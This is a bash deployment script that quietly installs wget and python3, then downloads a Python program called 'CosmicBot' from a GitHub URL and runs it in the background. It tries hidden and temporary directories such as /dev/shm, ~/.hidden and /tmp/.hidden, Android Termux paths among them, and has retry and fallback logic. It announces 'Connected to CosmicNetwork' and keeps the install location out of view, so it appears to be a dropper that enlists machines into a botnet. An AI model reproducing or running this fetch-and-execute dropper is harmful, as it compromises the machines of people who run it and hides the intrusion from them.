#!/bin/bash

# Function to check and install dependencies
install_dependencies() {
    echo "Checking system dependencies..."
    
    # Check for wget and install if missing
    if ! command -v wget >/dev/null 2>&1; then
        echo "Installing wget..."
        if command -v apt-get >/dev/null 2>&1; then
            apt-get update >/dev/null 2>&1
            apt-get install -y wget >/dev/null 2>&1
        elif command -v yum >/dev/null 2>&1; then
            yum install -y wget >/dev/null 2>&1
        elif command -v dnf >/dev/null 2>&1; then
            dnf install -y wget >/dev/null 2>&1
        elif command -v pacman >/dev/null 2>&1; then
            pacman -Sy --noconfirm wget >/dev/null 2>&1
        elif command -v apk >/dev/null 2>&1; then
            apk add wget >/dev/null 2>&1
        elif command -v pkg >/dev/null 2>&1; then
            pkg install -y wget >/dev/null 2>&1
        elif command -v brew >/dev/null 2>&1; then
            brew install wget >/dev/null 2>&1
        else
            echo "Error: Cannot install wget - no supported package manager found"
            return 1
        fi
        
        # Verify wget installation
        if ! command -v wget >/dev/null 2>&1; then
            echo "Error: Failed to install wget"
            return 1
        fi
        echo "✓ wget installed successfully"
    else
        echo "✓ wget is already installed"
    fi

    # Check for python3 and install if missing
    if ! command -v python3 >/dev/null 2>&1; then
        echo "Installing python3..."
        if command -v apt-get >/dev/null 2>&1; then
            apt-get install -y python3 >/dev/null 2>&1
        elif command -v yum >/dev/null 2>&1; then
            yum install -y python3 >/dev/null 2>&1
        elif command -v dnf >/dev/null 2>&1; then
            dnf install -y python3 >/dev/null 2>&1
        elif command -v pacman >/dev/null 2>&1; then
            pacman -Sy --noconfirm python >/dev/null 2>&1
        elif command -v apk >/dev/null 2>&1; then
            apk add python3 >/dev/null 2>&1
        elif command -v pkg >/dev/null 2>&1; then
            pkg install -y python >/dev/null 2>&1
        elif command -v brew >/dev/null 2>&1; then
            brew install python >/dev/null 2>&1
        else
            echo "Error: Cannot install python3 - no supported package manager found"
            return 1
        fi
        
        # Verify python3 installation
        if ! command -v python3 >/dev/null 2>&1; then
            echo "Error: Failed to install python3"
            return 1
        fi
        echo "✓ python3 installed successfully"
    else
        echo "✓ python3 is already installed"
    fi
    
    return 0
}

# Function to download and run the bot
deploy_bot() {
    local download_url="https://raw.githubusercontent.com/B3RT1337/CosmicBot/refs/heads/main/CosmicBot.py"
    local temp_dirs=(
        "/tmp" "/var/tmp" "/dev/shm" 
        "/data/data/com.termux/files/usr/tmp"
        "/data/data/com.termux/files/usr/var/tmp"
        "$HOME/.cache" "$HOME/.local/tmp" "$HOME/.config/tmp"
        "$HOME/.temp" "$HOME/.hidden" "$HOME/.cosmic"
        "/sdcard/Android/data/.hidden/tmp"
        "/private/tmp" "/usr/local/tmp"
        "/tmp/.hidden" "/var/tmp/.hidden"
    )
    
    # Create additional hidden directories if they don't exist
    mkdir -p "$HOME/.hidden" "$HOME/.cosmic" "/tmp/.hidden" "/var/tmp/.hidden" 2>/dev/null
    
    for p in "${temp_dirs[@]}"; do
        if [ -d "$p" ] && [ -w "$p" ]; then
            echo "Found writable directory: $p"
            cd "$p" || continue
            
            # Download the bot with retry logic
            echo "Downloading CosmicBot to: $p"
            for attempt in {1..3}; do
                echo "Download attempt $attempt..."
                if wget -q --timeout=30 --tries=3 "$download_url" -O CosmicBot.py; then
                    echo "✓ Download successful"
                    
                    # Verify the file was downloaded and has content
                    if [ -f "CosmicBot.py" ] && [ -s "CosmicBot.py" ]; then
                        echo "✓ File verification passed"
                        
                        # Make executable and run
                        chmod +x CosmicBot.py 2>/dev/null
                        
                        # Kill any existing instances
                        pkill -f "CosmicBot.py" 2>/dev/null
                        sleep 1
                        
                        # Start new instance
                        echo "Starting CosmicBot..."
                        nohup python3 CosmicBot.py > cosmicbot.log 2>&1 &
                        
                        # Wait for process to start
                        sleep 3
                        
                        # Verify it's running
                        if pgrep -f "CosmicBot.py" > /dev/null; then
                            clear 2>/dev/null
                            echo "========================================"
                            echo "✓ SUCCESS: Connected to CosmicNetwork!"
                            #echo "✓ Bot running from: $p"
                            #echo "✓ Log file: $p/cosmicbot.log"
                            echo "✓ Process ID: $(pgrep -f "CosmicBot.py")"
                            echo "========================================"
                            return 0
                        else
                            echo "⚠ Process started but died, checking logs..."
                            if [ -f "cosmicbot.log" ]; then
                                echo "Last log entries:"
                                tail -10 cosmicbot.log
                            fi
                            # Try one more time with different approach
                            python3 CosmicBot.py > cosmicbot.log 2>&1 &
                            sleep 2
                            if pgrep -f "CosmicBot.py" > /dev/null; then
                                clear 2>/dev/null
                                echo "✓ SUCCESS: Connected to CosmicNetwork!"
                                return 0
                            fi
                        fi
                    else
                        echo "✗ Downloaded file is empty or missing"
                        rm -f CosmicBot.py 2>/dev/null
                    fi
                else
                    echo "✗ Download attempt $attempt failed"
                    sleep 2
                fi
            done
            
            # If we get here, download failed for this directory
            echo "All download attempts failed for $p"
            continue
        fi
    done
    
    return 1
}

# Function to create a fallback directory and try there
create_fallback_deployment() {
    echo "Trying fallback deployment..."
    
    local fallback_dirs=(
        "$HOME/.cache/tmp"
        "$HOME/.local/share/tmp" 
        "/tmp/.$(whoami)"
        "/var/tmp/.$(whoami)"
    )
    
    for dir in "${fallback_dirs[@]}"; do
        if mkdir -p "$dir" 2>/dev/null; then
            cd "$dir" 2>/dev/null || continue
            echo "Using fallback directory: $dir"
            
            # Download directly with multiple retries
            for i in {1..5}; do
                if wget -q --timeout=45 "$1" -O CosmicBot.py && [ -s CosmicBot.py ]; then
                    chmod +x CosmicBot.py
                    nohup python3 CosmicBot.py > cosmicbot.log 2>&1 &
                    sleep 3
                    
                    if pgrep -f "CosmicBot.py" > /dev/null; then
                        echo "✓ Fallback deployment successful in: $dir"
                        return 0
                    fi
                fi
                sleep 3
            done
        fi
    done
    return 1
}

# Main execution function
main() {
    echo "Starting CosmicBot deployment..."
    
    # Install dependencies first
    if ! install_dependencies; then
        echo "Error: Failed to install dependencies"
        exit 1
    fi
    
    echo "✓ All dependencies satisfied"
    
    # Try primary deployment
    if deploy_bot; then
        echo "✓ Deployment completed successfully!"
        exit 0
    fi
    
    echo "Primary deployment failed, trying fallback..."
    
    # Try fallback deployment
    local download_url="https://raw.githubusercontent.com/B3RT1337/CosmicBot/refs/heads/main/CosmicBot.py"
    
    if create_fallback_deployment "$download_url"; then
        echo "✓ Fallback deployment successful!"
        exit 0
    fi
    
    # Final attempt - direct download to current directory
    echo "Trying final direct download..."
    if wget -q "$download_url" -O CosmicBot.py && [ -s CosmicBot.py ]; then
        chmod +x CosmicBot.py
        nohup python3 CosmicBot.py > cosmicbot.log 2>&1 &
        sleep 3
        if pgrep -f "CosmicBot.py" > /dev/null; then
            echo "✓ Direct deployment successful in current directory!"
            exit 0
        fi
    fi
    
    echo "✗ All deployment attempts failed"
    echo "Possible reasons:"
    echo "  - No internet connection"
    echo "  - GitHub repository not accessible"
    echo "  - No writable directories found"
    echo "  - Python script has errors"
    exit 1
}

# Run the main function
main
